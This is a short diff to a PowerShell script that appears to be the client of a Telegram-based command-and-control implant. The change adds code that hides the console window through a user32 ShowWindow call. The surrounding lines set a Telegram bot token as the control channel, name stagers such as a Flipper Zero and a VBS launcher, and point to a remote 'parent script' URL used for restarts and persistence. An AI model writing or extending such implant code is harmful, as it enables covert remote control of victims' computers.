@@ -14,6 +14,15 @@ SEE README FOR MORE INFO
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
+# HIDE THE WINDOW - Change to 1 to hide the console window
+$HideWindow = 1
+
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+}
+
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
